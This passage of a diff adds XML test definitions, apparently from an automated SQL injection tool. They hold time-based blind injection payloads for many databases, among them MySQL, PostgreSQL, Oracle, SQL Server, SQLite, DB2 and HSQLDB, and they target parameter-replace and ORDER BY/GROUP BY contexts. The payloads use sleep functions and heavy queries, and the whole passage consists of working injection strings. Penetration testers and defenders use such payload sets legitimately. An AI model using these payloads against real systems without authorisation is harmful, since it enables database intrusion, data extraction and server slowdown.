+            <dbms_version>&gt;= 5.0.12</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL &gt;= 5.0.12 time-based blind - Parameter replace (substraction)</title>
+        <stype>5</stype>
+        <level>3</level>
+        <risk>1</risk>
+        <clause>1,2,3,9</clause>
+        <where>3</where>
+        <vector>(SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])</vector>
+        <request>
+            <payload>(SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME])))[RANDSTR])</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.0.12</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL &lt; 5.0.12 time-based blind - Parameter replace (BENCHMARK)</title>
+        <stype>5</stype>
+        <level>4</level>
+        <risk>2</risk>
+        <clause>1,2,3,9</clause>
+        <where>3</where>
+        <vector>(CASE WHEN ([INFERENCE]) THEN (SELECT BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))) ELSE [RANDNUM])</vector>
+        <request>
+            <payload>(CASE WHEN ([RANDNUM]=[RANDNUM]) THEN (SELECT BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))) ELSE [RANDNUM])</payload>
+        </request>
+        <response>
+            <time>[DELAYED]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&lt; 5.0.12</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL &gt; 5.0.12 time-based blind - Parameter replace (heavy query - comment)</title>
+        <stype>5</stype>
+        <level>5</level>
+        <risk>2</risk>
+        <clause>1,2,3,9</clause>
+        <where>3</where>
+        <vector>IF(([INFERENCE]),(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1),[RANDNUM])</vector>
+        <request>
+            <payload>(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1)</payload>
+        </request>
+        <response>
+            <time>[DELAYED]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt; 5.0.12</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL time-based blind - Parameter replace (bool)</title>
+        <stype>5</stype>
+        <level>4</level>
+        <risk>1</risk>
+        <clause>1,2,3,9</clause>
+        <where>3</where>
+        <vector>([INFERENCE] AND SLEEP([SLEEPTIME]))</vector>
+        <request>
+            <payload>([RANDNUM]=[RANDNUM] AND SLEEP([SLEEPTIME]))</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL time-based blind - Parameter replace (ELT)</title>
+        <stype>5</stype>
+        <level>5</level>
+        <risk>1</risk>
+        <clause>1,2,3,9</clause>
+        <where>3</where>
+        <vector>ELT([INFERENCE],SLEEP([SLEEPTIME]))</vector>
+        <request>
+            <payload>ELT([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME]))</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL time-based blind - Parameter replace (MAKE_SET)</title>
+        <stype>5</stype>
+        <level>5</level>
+        <risk>1</risk>
+        <clause>1,2,3,9</clause>
+        <where>3</where>
+        <vector>MAKE_SET([INFERENCE],SLEEP([SLEEPTIME]))</vector>
+        <request>
+            <payload>MAKE_SET([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME]))</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>PostgreSQL &gt; 8.1 time-based blind - Parameter replace</title>
+        <stype>5</stype>
+        <level>3</level>
+        <risk>1</risk>
+        <clause>1,2,3,9</clause>
+        <where>3</where>
+        <vector>(CASE WHEN ([INFERENCE]) THEN (SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME])) ELSE [RANDNUM] END)</vector>
+        <request>
+            <payload>(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME]))</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>PostgreSQL</dbms>
+            <dbms_version>&gt; 8.1</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>PostgreSQL time-based blind - Parameter replace (heavy query)</title>
+        <stype>5</stype>
+        <level>4</level>
+        <risk>2</risk>
+        <clause>1,2,3,9</clause>
+        <where>3</where>
+        <vector>(CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000)) ELSE [RANDNUM] END)</vector>
+        <request>
+            <payload>(SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000))</payload>
+        </request>
+        <response>
+            <time>[DELAYED]</time>
+        </response>
+        <details>
+            <dbms>PostgreSQL</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Microsoft SQL Server/Sybase time-based blind - Parameter replace (heavy queries)</title>
+        <stype>5</stype>
+        <level>4</level>
+        <risk>2</risk>
+        <clause>1,3,9</clause>
+        <where>3</where>
+        <vector>(SELECT (CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) ELSE [RANDNUM] END))</vector>
+        <request>
+            <payload>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) ELSE [RANDNUM] END))</payload>
+        </request>
+        <response>
+            <time>[DELAYED]</time>
+        </response>
+        <details>
+            <dbms>Microsoft SQL Server</dbms>
+            <dbms>Sybase</dbms>
+        </details>
+    </test>
+
+    <!-- Without parentesis because it never works with them, useful to exploit SQL injection in Oracle E-Business Suite Financials -->
+    <test>
+        <title>Oracle time-based blind - Parameter replace (DBMS_LOCK.SLEEP)</title>
+        <stype>5</stype>
+        <level>3</level>
+        <risk>1</risk>
+        <clause>1,3,9</clause>
+        <where>3</where>
+        <vector>BEGIN IF ([INFERENCE]) THEN DBMS_LOCK.SLEEP([SLEEPTIME]); ELSE DBMS_LOCK.SLEEP(0); END IF; END;</vector>
+        <request>
+            <payload>BEGIN IF ([RANDNUM]=[RANDNUM]) THEN DBMS_LOCK.SLEEP([SLEEPTIME]); ELSE DBMS_LOCK.SLEEP(0); END IF; END;</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>Oracle</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Oracle time-based blind - Parameter replace (DBMS_PIPE.RECEIVE_MESSAGE)</title>
+        <stype>5</stype>
+        <level>3</level>
+        <risk>1</risk>
+        <clause>1,3,9</clause>
+        <where>3</where>
+        <vector>(SELECT (CASE WHEN ([INFERENCE]) THEN DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) ELSE [RANDNUM] END) FROM DUAL)</vector>
+        <request>
+            <payload>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) ELSE [RANDNUM] END) FROM DUAL)</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>Oracle</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Oracle time-based blind - Parameter replace (heavy queries)</title>
+        <stype>5</stype>
+        <level>4</level>
+        <risk>2</risk>
+        <clause>1,3,9</clause>
+        <where>3</where>
+        <vector>(SELECT (CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) ELSE [RANDNUM] END) FROM DUAL)</vector>
+        <request>
+            <payload>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN (SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) ELSE [RANDNUM] END) FROM DUAL)</payload>
+        </request>
+        <response>
+            <time>[DELAYED]</time>
+        </response>
+        <details>
+            <dbms>Oracle</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>SQLite &gt; 2.0 time-based blind - Parameter replace (heavy query)</title>
+        <stype>5</stype>
+        <level>4</level>
+        <risk>2</risk>
+        <clause>1,2,3,9</clause>
+        <where>3</where>
+        <vector>(SELECT (CASE WHEN ([INFERENCE]) THEN (LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))) ELSE [RANDNUM] END))</vector>
+        <request>
+            <payload>(SELECT LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2)))))</payload>
+        </request>
+        <response>
+            <time>[DELAYED]</time>
+        </response>
+        <details>
+            <dbms>SQLite</dbms>
+            <dbms_version>&gt; 2.0</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>Firebird time-based blind - Parameter replace (heavy query)</title>
+        <stype>5</stype>
+        <level>5</level>
+        <risk>2</risk>
+        <clause>1,2,3,9</clause>
+        <where>3</where>
+        <vector>IIF(([INFERENCE]),(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4),[RANDNUM])</vector>
+        <request>
+            <payload>(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4)</payload>
+        </request>
+        <response>
+            <time>[DELAYED]</time>
+        </response>
+        <details>
+            <dbms>Firebird</dbms>
+            <dbms_version>&gt;= 2.0</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>SAP MaxDB time-based blind - Parameter replace (heavy query)</title>
+        <stype>5</stype>
+        <level>5</level>
+        <risk>2</risk>
+        <clause>1,3,9</clause>
+        <where>3</where>
+        <vector>(SELECT COUNT(*) FROM (SELECT * FROM DOMAIN.DOMAINS WHERE ([INFERENCE])) AS T1,(SELECT * FROM DOMAIN.COLUMNS WHERE ([INFERENCE])) AS T2,(SELECT * FROM DOMAIN.TABLES WHERE ([INFERENCE])) AS T3)</vector>
+        <request>
+            <payload>(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)</payload>
+        </request>
+        <response>
+            <time>[DELAYED]</time>
+        </response>
+        <details>
+            <dbms>SAP MaxDB</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>IBM DB2 time-based blind - Parameter replace (heavy query)</title>
+        <stype>5</stype>
+        <level>5</level>
+        <risk>2</risk>
+        <clause>1,2,3,9</clause>
+        <where>3</where>
+        <vector>(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3 WHERE ([INFERENCE]))</vector>
+        <request>
+            <payload>(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3)</payload>
+        </request>
+        <response>
+            <time>[DELAYED]</time>
+        </response>
+        <details>
+            <dbms>IBM DB2</dbms>
+        </details>
+    </test>
+
+    <!-- Untested -->
+    <test>
+        <title>HSQLDB &gt;= 1.7.2 time-based blind - Parameter replace (heavy query)</title>
+        <stype>5</stype>
+        <level>4</level>
+        <risk>2</risk>
+        <clause>1,2,3,9</clause>
+        <where>3</where>
+        <vector>(SELECT (CASE WHEN ([INFERENCE]) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]00000000),NULL) ELSE '[RANDSTR]' END) FROM INFORMATION_SCHEMA.SYSTEM_USERS)</vector>
+        <request>
+            <payload>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]00000000),NULL) ELSE '[RANDSTR]' END) FROM INFORMATION_SCHEMA.SYSTEM_USERS)</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>HSQLDB</dbms>
+            <dbms_version>&gt;= 1.7.2</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>HSQLDB &gt; 2.0 time-based blind - Parameter replace (heavy query)</title>
+        <stype>5</stype>
+        <level>5</level>
+        <risk>2</risk>
+        <clause>1,2,3,9</clause>
+        <where>3</where>
+        <vector>(SELECT (CASE WHEN ([INFERENCE]) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL) ELSE '[RANDSTR]' END) FROM (VALUES(0)))</vector>
+        <request>
+            <payload>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL) ELSE '[RANDSTR]' END) FROM (VALUES(0)))</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>HSQLDB</dbms>
+            <dbms_version>&gt; 2.0</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>Informix time-based blind - Parameter replace (heavy query)</title>
+        <stype>5</stype>
+        <level>4</level>
+        <risk>2</risk>
+        <clause>1,2,3,9</clause>
+        <where>3</where>
+        <vector>(CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR) ELSE [RANDNUM] END)</vector>
+        <request>
+            <payload>(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)</payload>
+        </request>
+        <response>
+            <time>[DELAYED]</time>
+        </response>
+        <details>
+            <dbms>Informix</dbms>
+        </details>
+    </test>
+    <!-- End of time-based boolean tests - Parameter replace -->
+
+    <!-- Time-based boolean tests - ORDER BY, GROUP BY clause -->
+    <test>
+        <title>MySQL &gt;= 5.0.12 time-based blind - ORDER BY, GROUP BY clause</title>
+        <stype>5</stype>
+        <level>3</level>
+        <risk>1</risk>
+        <clause>2,3</clause>
+        <where>1</where>
+        <vector>,(SELECT (CASE WHEN ([INFERENCE]) THEN SLEEP([SLEEPTIME]) ELSE [RANDNUM] END))</vector>
+        <request>
+            <payload>,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN SLEEP([SLEEPTIME]) ELSE [RANDNUM] END))</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.0.12</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL &lt; 5.0.12 time-based blind - ORDER BY, GROUP BY clause (BENCHMARK)</title>
+        <stype>5</stype>
+        <level>4</level>
+        <risk>2</risk>
+        <clause>2,3</clause>
+        <where>1</where>
+        <vector>,(SELECT (CASE WHEN ([INFERENCE]) THEN (SELECT BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))) ELSE [RANDNUM]*(SELECT [RANDNUM] FROM mysql.db) END))</vector>
+        <request>
+            <payload>,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN (SELECT BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))) ELSE [RANDNUM]*(SELECT [RANDNUM] FROM mysql.db) END))</payload>
+        </request>
+        <response>
+            <time>[DELAYED]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&lt; 5.0.12</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>PostgreSQL &gt; 8.1 time-based blind - ORDER BY, GROUP BY clause</title>
+        <stype>5</stype>
+        <level>3</level>
+        <risk>1</risk>
+        <clause>2,3</clause>
+        <where>1</where>
+        <vector>,(SELECT (CASE WHEN ([INFERENCE]) THEN (SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME])) ELSE 1/(SELECT 0) END))</vector>
+        <request>
+            <payload>,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN (SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME])) ELSE 1/(SELECT 0) END))</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>PostgreSQL</dbms>
+            <dbms_version>&gt; 8.1</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>PostgreSQL time-based blind - ORDER BY, GROUP BY clause (heavy query)</title>
+        <stype>5</stype>
+        <level>4</level>
+        <risk>2</risk>
+        <clause>2,3</clause>
+        <where>1</where>
+        <vector>,(SELECT (CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000)) ELSE 1/(SELECT 0) END))</vector>
+        <request>
+            <payload>,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN (SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000)) ELSE 1/(SELECT 0) END))</payload>
+        </request>
+        <response>
+            <time>[DELAYED]</time>
+        </response>
+        <details>
+            <dbms>PostgreSQL</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Microsoft SQL Server/Sybase time-based blind - ORDER BY clause (heavy query)</title>
+        <stype>5</stype>
+        <level>4</level>
+        <risk>2</risk>
+        <clause>2,3</clause>
+        <where>1</where>
+        <vector>,(SELECT (CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END))</vector>
+        <request>
+            <payload>,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END))</payload>
+        </request>
+        <response>
+            <time>[DELAYED]</time>
+        </response>
+        <details>
+            <dbms>Microsoft SQL Server</dbms>
+            <dbms>Sybase</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Oracle time-based blind - ORDER BY, GROUP BY clause (DBMS_LOCK.SLEEP)</title>
+        <stype>5</stype>
+        <level>3</level>
+        <risk>1</risk>
+        <clause>2,3</clause>
+        <where>1</where>
+        <vector>,(BEGIN IF ([INFERENCE]) THEN DBMS_LOCK.SLEEP([SLEEPTIME]); ELSE DBMS_LOCK.SLEEP(0); END IF; END;)</vector>
+        <request>
+            <payload>,(BEGIN IF ([RANDNUM]=[RANDNUM]) THEN DBMS_LOCK.SLEEP([SLEEPTIME]); ELSE DBMS_LOCK.SLEEP(0); END IF; END;)</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>Oracle</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Oracle time-based blind - ORDER BY, GROUP BY clause (DBMS_PIPE.RECEIVE_MESSAGE)</title>
+        <stype>5</stype>
+        <level>3</level>
+        <risk>1</risk>
+        <clause>2,3</clause>
+        <where>1</where>
+        <vector>,(SELECT (CASE WHEN ([INFERENCE]) THEN DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) ELSE 1/(SELECT 0 FROM DUAL) END) FROM DUAL)</vector>
+        <request>
+            <payload>,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) ELSE 1/(SELECT 0 FROM DUAL) END) FROM DUAL)</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>Oracle</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Oracle time-based blind - ORDER BY, GROUP BY clause (heavy query)</title>
+        <stype>5</stype>
+        <level>4</level>
+        <risk>2</risk>
+        <clause>2,3</clause>
+        <where>1</where>
+        <vector>,(SELECT (CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) ELSE 1/(SELECT 0 FROM DUAL) END) FROM DUAL)</vector>
+        <request>
+            <payload>,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN (SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) ELSE 1/(SELECT 0 FROM DUAL) END) FROM DUAL)</payload>
+        </request>
+        <response>
+            <time>[DELAYED]</time>
+        </response>
+        <details>
+            <dbms>Oracle</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>HSQLDB &gt;= 1.7.2 time-based blind - ORDER BY, GROUP BY clause (heavy query)</title>
+        <stype>5</stype>
+        <level>4</level>
+        <risk>2</risk>
+        <clause>2,3</clause>
+        <where>1</where>
+        <vector>,(SELECT (CASE WHEN ([INFERENCE]) THEN (ASCII(REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]00000000),NULL))) ELSE [RANDNUM]/(SELECT 0 FROM INFORMATION_SCHEMA.SYSTEM_USERS) END) FROM INFORMATION_SCHEMA.SYSTEM_USERS)</vector>
+        <request>
+            <payload>,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN (ASCII(REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]00000000),NULL))) ELSE [RANDNUM]/(SELECT 0 FROM INFORMATION_SCHEMA.SYSTEM_USERS) END) FROM INFORMATION_SCHEMA.SYSTEM_USERS)</payload>
+            <comment>--</comment>
+        </request>
+        <response>
+            <time>[DELAYED]</time>
+        </response>
+        <details>
+            <dbms>HSQLDB</dbms>
+            <dbms_version>&gt;= 1.7.2</dbms_version>
+        </details>
+    </test>    
+    
+    <test>
+        <title>HSQLDB &gt; 2.0 time-based blind - ORDER BY, GROUP BY clause (heavy query)</title>
+        <stype>5</stype>
+        <level>4</level>
+        <risk>2</risk>
+        <clause>2,3</clause>
+        <where>1</where>
+        <vector>,(SELECT (CASE WHEN ([INFERENCE]) THEN (ASCII(REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL))) ELSE [RANDNUM]/(SELECT 0 FROM (VALUES(0))) END) FROM (VALUES(0)))</vector>
+        <request>
+            <payload>,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN (ASCII(REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL))) ELSE [RANDNUM]/(SELECT 0 FROM (VALUES(0))) END) FROM (VALUES(0)))</payload>
+        </request>
+        <response>
+            <time>[DELAYED]</time>
+        </response>
+        <details>
+            <dbms>HSQLDB</dbms>
+            <dbms_version>&gt; 2.0</dbms_version>
+        </details>
+    </test>
+
+    <!-- End of time-based boolean tests - ORDER BY, GROUP BY clause -->
+</root>
